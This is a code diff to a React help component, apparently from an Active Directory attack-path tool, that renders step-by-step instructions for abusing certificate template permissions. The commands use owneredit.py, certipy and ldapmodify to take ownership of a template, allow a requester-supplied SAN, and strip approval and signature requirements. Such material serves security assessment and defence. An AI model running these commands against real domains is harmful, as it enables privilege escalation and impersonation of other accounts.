@@ -14,17 +14,16 @@
 //
 // SPDX-License-Identifier: Apache-2.0
 
-import { FC } from 'react';
 import { Typography } from '@mui/material';
-import { useHelpTextStyles } from '../utils';
+import { FC } from 'react';
 import CodeController from '../CodeController/CodeController';
+import { hasChildCodeElementsClasses } from '../utils';
 
 const LinuxAbuse: FC = () => {
-    const classes = useHelpTextStyles();
     const step0_1 = (
         <>
             <Typography variant='body2'>
-                <b>Step 0.1: </b>Set Obtain ownership (WriteOwner only)
+                <b>Step 0.1: </b>Obtain ownership (WriteOwner only)
                 <br />
                 <br />
                 If you only have WriteOwner on the affected certificate template, then you need to grant your principal
@@ -38,7 +37,7 @@ const LinuxAbuse: FC = () => {
             </CodeController>
             <Typography variant='body2'>Change the ownership of the object:</Typography>
             <CodeController>
-                {`owneredit.py -action write -owner 'attacker' -target-dn 'template-dn' 'domain'/'attacker':'password'`}
+                {`owneredit.py -action write -new-owner 'attacker' -target-dn 'template-dn' 'domain'/'attacker':'password'`}
             </CodeController>
             <Typography variant='body2'>
                 Confirm that the ownership was changed by running the first command again.
@@ -88,7 +87,7 @@ const LinuxAbuse: FC = () => {
             <CodeController>
                 {`certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old`}
             </CodeController>
-            <Typography variant='body2' className={classes.containsCodeEl}>
+            <Typography variant='body2' className={hasChildCodeElementsClasses}>
                 The <code>-save-old</code> parameter is used to save the old configuration, which is used afterward for
                 restoring the configuration:
             </Typography>
@@ -107,7 +106,7 @@ const LinuxAbuse: FC = () => {
 
     const step1b = (
         <>
-            <Typography variant='body2' className={classes.containsCodeEl}>
+            <Typography variant='body2' className={hasChildCodeElementsClasses}>
                 <b>Step 1.b: </b>Ensure the certificate template requires enrollee to specify Subject Alternative Name
                 (SAN)(GenericWrite or WritePKINameFlag, no GenericAll).
                 <br />
@@ -127,11 +126,11 @@ const LinuxAbuse: FC = () => {
             <CodeController>
                 {`ldapsearch -x -D "ATTACKER-DN" -w 'PWD' -h DOMAIN-DNS-NAME -b "TEMPLATE-DN" msPKI-Certificate-Name-Flag`}
             </CodeController>
-            <Typography variant='body2' className={classes.containsCodeEl}>
+            <Typography variant='body2' className={hasChildCodeElementsClasses}>
                 Set the <code>CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT</code> flag as the only enabled flag using ldapmodify:
             </Typography>
             <CodeController>
-                {`echo -e "dn: "TEMPLATE-DN"\nchangetype: modify\nreplace: msPKI-Certificate-Name-Flag\nmsPKI-Certificate-Name-Flag: 1" | ldapmodify -x -D "ATTACKER-DN" -w 'PWD' -h DOMAIN-DNS-NAME`}
+                {`echo -e "dn: TEMPLATE-DN\\nchangetype: modify\\nreplace: msPKI-Certificate-Name-Flag\\nmsPKI-Certificate-Name-Flag: 1" | ldapmodify -x -D "ATTACKER-DN" -w 'PWD' -h DOMAIN-DNS-NAME`}
             </CodeController>
             <Typography variant='body2'>
                 Run the first command again to confirm the attribute has been set.
@@ -145,7 +144,7 @@ const LinuxAbuse: FC = () => {
 
     const step1c = (
         <>
-            <Typography variant='body2' className={classes.containsCodeEl}>
+            <Typography variant='body2' className={hasChildCodeElementsClasses}>
                 <b>Step 1.c: </b>Ensure the certificate template does not require manager approval (GenericWrite or
                 WritePKIEnrollmentFlag, no GenericAll).
                 <br />
@@ -166,11 +165,11 @@ const LinuxAbuse: FC = () => {
             <CodeController>
                 {`ldapsearch -x -D "ATTACKER-DN" -w 'PWD' -h DOMAIN-DNS-NAME -b "TEMPLATE-DN" msPKI-Enrollment-Flag`}
             </CodeController>
-            <Typography variant='body2' className={classes.containsCodeEl}>
+            <Typography variant='body2' className={hasChildCodeElementsClasses}>
                 Remove all flags from <code>msPKI-Enrollment-Flag</code> using ldapmodify:
             </Typography>
             <CodeController>
-                {`echo -e "dn: "TEMPLATE-DN"\nchangetype: modify\nreplace: msPKI-Enrollment-Flag\nmsPKI-Enrollment-Flag: 0" | ldapmodify -x -D "ATTACKER-DN" -w 'PWD' -h DOMAIN-DNS-NAME`}
+                {`echo -e "dn: TEMPLATE-DN\\nchangetype: modify\\nreplace: msPKI-Enrollment-Flag\\nmsPKI-Enrollment-Flag: 0" | ldapmodify -x -D "ATTACKER-DN" -w 'PWD' -h DOMAIN-DNS-NAME`}
             </CodeController>
             <Typography variant='body2'>
                 Run the first command again to confirm the attribute has been set.
@@ -184,7 +183,7 @@ const LinuxAbuse: FC = () => {
 
     const step1d = (
         <>
-            <Typography variant='body2' className={classes.containsCodeEl}>
+            <Typography variant='body2' className={hasChildCodeElementsClasses}>
                 <b>Step 1.d: </b>Ensure the certificate template allows for client authentication (GenericWrite, no
                 GenericAll).
                 <br />
@@ -206,15 +205,10 @@ const LinuxAbuse: FC = () => {
             <CodeController>{`ldapsearch -x -D "ATTACKER-DN" -w 'PWD' -h DOMAIN-DNS-NAME -b "TEMPLATE-DN" pKIExtendedKeyUsage`}</CodeController>
             <Typography variant='body2'>Set the Client Authentication EKU using ldapmodify:</Typography>
             <CodeController>
-                {`echo -e "dn: "TEMPLATE-DN"
-                changetype: modify
-                replace: msPKI-Certificate-Application-Policy\nmsPKI-Certificate-Application-Policy: 1.3.6.1.5.5.7.3.2" | ldapmodify -x -D "ATTACKER-DN" -w 'PWD' -h DOMAIN-DNS-NAME`}
+                {`echo -e "dn: TEMPLATE-DN\\nchangetype: modify\\nreplace: msPKI-Certificate-Application-Policy\\nmsPKI-Certificate-Application-Policy: 1.3.6.1.5.5.7.3.2" | ldapmodify -x -D "ATTACKER-DN" -w 'PWD' -h DOMAIN-DNS-NAME`}
             </CodeController>
             <CodeController>
-                {`echo -e "dn: "TEMPLATE-DN"
-                changetype: modify
-                replace: pKIExtendedKeyUsage
-                pKIExtendedKeyUsage: 1.3.6.1.5.5.7.3.2" | ldapmodify -x -D "ATTACKER-DN" -w 'PWD' -h DOMAIN-DNS-NAME`}
+                {`echo -e "dn: TEMPLATE-DN\\nchangetype: modify\\nreplace: pKIExtendedKeyUsage\\npKIExtendedKeyUsage: 1.3.6.1.5.5.7.3.2" | ldapmodify -x -D "ATTACKER-DN" -w 'PWD' -h DOMAIN-DNS-NAME`}
             </CodeController>
             <Typography variant='body2'>
                 Run the first two command again to confirm the attributes have been set.
@@ -224,18 +218,14 @@ const LinuxAbuse: FC = () => {
                 but with the original values instead. To set multiple EKUs, use this format:
             </Typography>
             <CodeController>
-                {`echo -e "dn: "TEMPLATE-DN"
-                changetype: modify
-                replace: ATTRIBUTE
-                ATTRIBUTE: EKU1
-                ATTRIBUTE: EKU2" | ldapmodify -x -D "ATTACKER-DN" -w 'PWD' -h DOMAIN-DNS-NAME`}
+                {`echo -e "dn: TEMPLATE-DN\\nchangetype: modify\\nreplace: ATTRIBUTE\\nATTRIBUTE: EKU1\\nATTRIBUTE: EKU2" | ldapmodify -x -D "ATTACKER-DN" -w 'PWD' -h DOMAIN-DNS-NAME`}
             </CodeController>
         </>
     );
 
     const step1e = (
         <>
-            <Typography variant='body2' className={classes.containsCodeEl}>
+            <Typography variant='body2' className={hasChildCodeElementsClasses}>
                 <b>Step 1.e: </b>Ensure the certificate template does not require authorized signatures (GenericWrite,
                 no GenericAll).
                 <br />
@@ -257,14 +247,11 @@ const LinuxAbuse: FC = () => {
             <CodeController>
                 {`ldapsearch -x -D "ATTACKER-DN" -w 'PWD' -h DOMAIN-DNS-NAME -b "TEMPLATE-DN" msPKI-RA-Signature`}
             </CodeController>
-            <Typography variant='body2' className={classes.containsCodeEl}>
+            <Typography variant='body2' className={hasChildCodeElementsClasses}>
                 Remove all flags from <code>msPKI-RA-Signature</code> using ldapmodify:
             </Typography>
             <CodeController>
-                {`echo -e "dn: "TEMPLATE-DN"
-                changetype: modify
-                replace: msPKI-RA-Signature
-                msPKI-RA-Signature: 0" | ldapmodify -x -D "ATTACKER-DN" -w 'PWD' -h DOMAIN-DNS-NAME`}
+                {`echo -e "dn: TEMPLATE-DN\\nchangetype: modify\\nreplace: msPKI-RA-Signature\\nmsPKI-RA-Signature: 0" | ldapmodify -x -D "ATTACKER-DN" -w 'PWD' -h DOMAIN-DNS-NAME`}
             </CodeController>
             <Typography variant='body2'>
                 Run the first command again to confirm the attribute has been set.
